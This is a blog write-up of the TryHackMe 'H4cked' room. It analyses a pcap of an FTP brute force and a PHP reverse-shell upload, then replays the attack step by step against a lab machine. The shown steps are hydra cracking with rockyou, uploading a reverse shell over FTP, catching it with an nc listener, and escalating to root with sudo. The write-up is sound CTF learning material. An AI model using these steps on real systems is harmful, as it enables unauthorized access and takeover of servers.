---
title: "H4cked"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src="hacked.png" width=200 alt="hacked">

Hey! how are yo doing? 

We are usually on the red side, trying to hack machines

But today we doing blue stuff

Investigating a pcap file to catch a hacker

## Analysis

we open `Capture.pcapng` with your favorite tool

I go with `wireshark`

Just read a bit and you already understand someone is trying to `ftp` as `jenny`

Might be bruteforcing with `hydra`

Follow the tcp stream on successful login to get the password `password123`

He was in `/var/www/html` then made a http get request for `/shell.php`

the file can be read after `ftp-data` filter is applied

obviously its from [pentestmonkeys](http://pentestmonkey.net/tools/php-reverse-shell)! 

I dumped the file content as printable text in a txt file for readabilty

Now its time to follow the tcp stream again and get his actions inside `wir3`

he spawnned a more comfortable shell with the good ol'

```
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

then used `whoami` then `sudo su` like a boss 

jenny got too many privileges for someone using such a weak password

My man cloned a badass backdoor from project [Reptile](git clone https://github.com/f0rb1dd3n/Reptile.git)

Just read about it!

Now its time to do better than the attacker

## Getting Access

he obviously changed the password so we can't just ssh as jenny (duh)

so we have to re-do everything

we can directly get into the hydra cracking

```
└──╼ $hydra -l jenny -P /usr/share/wordlists/rockyou.txt ftp://10.10.100.132/
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-01 17:33:29
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.100.132:21/
[STATUS] 93.00 tries/min, 93 tries in 00:01h, 14344339 to do in 2570:41h, 16 active
[21][ftp] host: 10.10.100.132   login: jenny   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 13 final worker threads did not complete until end.
[ERROR] 13 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-01 17:34:51

```

He is doing better than jenny at least

```
└──╼ $ftp 10.10.100.132
Connected to 10.10.100.132.
220 Hello FTP World!
Name (10.10.100.132:nair0lf32): jenny
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

```

Updated his own shell to serve us as `shell2.php`

```

ftp> put /h4cked/shell2.php shell2.php
local: /h4cked/shell2.php remote: shell2.php
227 Entering Passive Mode (10,10,100,132,140,101)
150 Ok to send data.
226 Transfer complete.
5524 bytes sent in 0.00 secs (65.0382 MB/s)
ftp> ls
227 Entering Passive Mode (10,10,100,132,170,74)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000        10918 Feb 01  2021 index.html
-rwxrwxrwx    1 1000     1000         5493 Feb 01  2021 shell.php
-rw-------    1 1000     1000         5524 Feb 01 17:12 shell2.php
ftp> chmod 777 shell2.php
200 SITE CHMOD command ok.
```

We are in too! Now Get that TTY!

```
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 43016
Linux wir3 4.15.0-135-generic #139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 17:15:04 up 39 min,  0 users,  load average: 0.00, 0.00, 0.10
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@wir3:/$

```

## privilege escalation

Now we do the good ol' switcheroo

```
www-data@wir3:/home/jenny$ su jenny
su jenny
Password: 987654321

jenny@wir3:~$ sudo su
sudo su
[sudo] password for jenny: 987654321

root@wir3:/home/jenny# 


```

Get the flag

```
root@wir3:/home/jenny# cd /root
cd /root
root@wir3:~# ls
ls
Reptile
root@wir3:~# cd Reptile
cd Reptile
root@wir3:~/Reptile# ls
ls
configs   Kconfig  Makefile  README.md  userland
flag.txt  kernel   output    scripts
root@wir3:~/Reptile# cat flag.txt
cat flag.txt
straight_to_jail_intruder
```

Nice,simple, easy room!
